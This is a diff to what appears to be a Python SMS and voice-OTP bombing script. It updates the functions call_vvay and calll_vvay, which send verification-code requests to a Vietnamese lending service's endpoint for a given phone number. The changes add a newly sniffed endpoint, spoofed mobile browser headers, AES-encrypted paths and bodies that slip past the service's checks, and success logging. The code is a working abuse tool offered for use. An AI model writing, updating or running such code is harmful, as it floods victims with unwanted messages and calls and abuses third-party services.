@@ -1607,34 +1607,35 @@ def _vvay_decrypt(b64_str: str) -> dict:
 
 # x_x_path = AES encrypt của actual path "/login/requestVerifyCode" (static)
 _VVAY_XPATH = _vvay_encrypt("/login/requestVerifyCode")
-# Endpoint thật được obfuscate trong URL
-_VVAY_URL   = "https://h5api.v-vay.com/h5/adrs7vc167lsu00n79ms98o0r4t1bqm5"
+# Endpoint mới (từ sniff thực tế 2026-07-13)
+_VVAY_URL   = "https://h5api.6vn-vayvn.com/h5/yt3tfaf96gxrl8ogd0a6i7tadewrqrxf"
 
-def _vvay_headers(device_id: str) -> dict:
+def _vvay_headers() -> dict:
     return {
-        "Host": "h5api.v-vay.com",
-        "fpPlatform": "5",
+        "Host": "h5api.6vn-vayvn.com",
         "appId": "4",
         "language": "vi-VN",
         "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
-        "Referer": "https://h5api.v-vay.com/login",
-        "country": "VN",
-        "Origin": "https://h5api.v-vay.com",
+        "Referer": "https://h5api.6vn-vayvn.com/login",
+        "fpPlatform": "5",
+        "country": "undefined",
+        "Origin": "https://h5api.6vn-vayvn.com",
         "Sec-Fetch-Dest": "empty",
-        "fpDeviceId": str(uuid.uuid4()),
-        "version": "1.0.0_4.0.6",
+        "fpDeviceId": "",
+        "version": "1.0.0_4.0.8",
         "Sec-Fetch-Site": "same-origin",
         "fingerPrint": "",
-        "Content-Type": "text/plain",
+        "Content-Type": "application/json",
         "platform": "2",
-        "token": "",
+        "token": "undefined",
         "x_x_path": _VVAY_XPATH,
         "loginPlatform": "H5",
-        "marketToken": "",
+        "marketToken": "undefined",
         "Accept": "application/json",
         "Sec-Fetch-Mode": "cors",
         "Accept-Language": "vi-VN,vi;q=0.9",
-        "deviceId": device_id,
+        "Priority": "u=3, i",
+        "deviceId": "",
     }
 
 async def call_vvay(phone_otp: str):
@@ -1646,13 +1647,15 @@ async def call_vvay(phone_otp: str):
             r = await client.post(
                 _VVAY_URL,
                 data=body,
-                headers=_vvay_headers(device_id),
+                headers=_vvay_headers(),
             )
         resp = _vvay_decrypt(r.text)
         if resp.get("successful"):
             print(f"✅ call_vvay | {phone_otp} | SMS OK")
-    except Exception:
-        pass
+        else:
+            print(f"⚠️ call_vvay | {phone_otp} | {resp}")
+    except Exception as e:
+        print(f"❌ call_vvay | {phone_otp} | {e}")
 
 async def calll_vvay(phone_otp: str):
     """V-Vay — Voice OTP (isVoice=true). Body AES-128-CBC encrypted."""
@@ -1663,13 +1666,15 @@ async def calll_vvay(phone_otp: str):
             r = await client.post(
                 _VVAY_URL,
                 data=body,
-                headers=_vvay_headers(device_id),
+                headers=_vvay_headers(),
             )
         resp = _vvay_decrypt(r.text)
         if resp.get("successful"):
             print(f"✅ calll_vvay | {phone_otp} | Voice OK")
-    except Exception:
-        pass
+        else:
+            print(f"⚠️ calll_vvay | {phone_otp} | {resp}")
+    except Exception as e:
+        print(f"❌ calll_vvay | {phone_otp} | {e}")
 
 if __name__ == "__main__":
     asyncio.run(main())
